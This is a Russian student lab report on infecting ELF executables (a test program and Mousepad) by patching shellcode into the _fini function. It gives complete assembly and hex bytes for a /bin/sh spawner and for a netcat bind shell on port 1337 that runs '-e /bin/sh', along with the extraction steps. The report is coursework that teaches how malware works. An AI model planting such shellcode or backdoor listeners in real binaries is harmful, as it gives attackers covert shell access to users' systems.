# Лабораторная работа №2

По дисциплине Модели Нарушения Безопасности и Вирусология.

Выполнили:
- Бахир А.Д. группа 7361
- Богович А.Н. группа 7361

Преподаватель:
Савельев М.Ф.

## Задание

1. Выбрать PE файл для заражения . Рекомендуется взять стандартные приложения, например блокнот. Можно выбрать любые другие.
2. Определить оптимальное место расположения шелкода и расположить  его так, чтобы основная логика работы приложения не нарушилась.
3. Продемонстрировать запуск шеллкода при работе приложения по выбранному тригеру. (Например, при работе блокнота каждое заданное время во внешний файл пишется строчка произвольная строчка текста, тем самым увеличивая файл). МОЖНО выбрать ЛЮБОЕ действие шеллкода.

## Описание работы

### Выбор заражаемого файла

Выберем файл для заражения. Так как работа выполняется в Unix системе, файл будет не PE, а ELF, но сильных различий это не вносит. Попробуем заразить два исполняемых файла, один из которых это наша "тестовая" программа, а второй - текстовый редактор Mousepad, аналог блокнота в окружении xfce.

Исходный код тестовой программы:

```сpp
#include <stdlib.h>
#include <unistd.h>
 
 
int main (void)
{
    write(1, "hello and bye\n", 15);
    return EXIT_SUCCESS;
}
```

### Подготовка шелл кода

Для заражения попробуем использовать два шеллкода с различной длинной.

Первый совершает системный вызов `execveat("/bin/sh")`:

Исходный код:

```asm
    push   0x42
    pop    rax
    inc    ah
    cqo
    push   rdx
    mov    rdi, 0x68732f2f6e69622f
    push   rdi
    push   rsp
    pop    rsi
    mov    r8, rdx
    mov    r10, rdx
    syscall
```

Далее, нам нужно получить последовательность инструкций в шестнадцатиричном формате. Для этого компилируется шеллкод в исполняемый файл, дизассемблируем его и приводим дизассемблированные инструкции к нужному нам виду.

Компилируем:

```shell
nasm -f elf64 ${nasm_file} -o build/${filename}.o \
    && ld -m elf_x86_64 build/${filename}.o -o build/${filename}
```

Дизассемблируем:

```shell
objdump -d ${FILE} \
    | grep '[0-91a-f]:' \
    | grep -v 'файл' \
    | cut -f2 -d: \
    | cut -f1-7 -d' ' \
    | tr -s ' ' \
    | tr 't' ' ' \
    | sed 's/ $//g' \
    | sed 's/[\t ]//g' \
    | paste -d '' -s
```

Получаем следующие данные:

```
6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
```

Аналогично поступим со вторым шеллкодом. 

Исходный код:

```asm
BITS 64
xor rdx,rdx
mov rdi, qword 0x636e2f6e69622fff
shr rdi,0x08
push rdi
mov rdi,rsp
  
mov rcx, qword 0x68732f6e69622fff
shr rcx,0x08
push rcx
mov rcx,rsp
  
mov rbx, qword 0x652dffffffffffff
shr rbx,0x30
push rbx
mov rbx,rsp
  
mov r10, qword 0x37333331ffffffff
shr r10,0x20
push r10
mov r10,rsp
  
mov r9, qword 0x702dffffffffffff
shr r9,0x30
push r9
mov r9,rsp
  
mov r8, qword 0x6c2dffffffffffff
shr r8,0x30
push r8
mov r8,rsp
  
push rdx ;push NULL
push rcx ;push address of 'bin/sh'
push rbx ;push address of '-e'
push r10 ;push address of '1337'
push r9 ;push address of '-p'
push r8 ;push address of '-l'
push rdi ;push address of '/bin/nc'
  
mov rsi,rsp
xor rax, rax
mov rax,59
syscall
```

Получаем данные:

```
4831d248bfff2f62696e2f6e6348c1ef08574889e748b9ff2f62696e2f736848c1e908514889e148bbffffffffffff2d6548c1eb30534889e349baffffffff3133333749c1ea2041524989e249b9ffffffffffff2d7049c1e93041514989e149b8ffffffffffff2d6c49c1e83041504989e0525153415241514150574889e64831c0b83b0000000f05
```

### Заражение файла

Для начала нужно опоределить место заражения исполняемого файла. Для этого воспользуемся утилитой objdump. На рисунке можно видеть результат дизассемблирования. Шеллкод будем помещать в функцию `_fini` (адрес в файле: `0x11c8`)

![](/docs/mnbiv_3.png)

На рисунке ниже представлено заражение файла. Справа в текстовом редакторе показан шеллкод, слева внизу открыт бинарный файл тестовой программы в hex формате. Выделеный участок - байты куда был вставлен шеллкод (адрес можно видеть слева). Начало шеллкода располагается по определённому заранее адресу - `0x11с8`.

![](/docs/mnbiv_4.png)

Слева вверху запущена заражённая тестовая программа с помощью утилиты strace. 
Как можно видеть, происходит вызов `execveat(., "/bin/sh")`, следовательно, заражение было выполнено успешно и вредоносный код выполнился.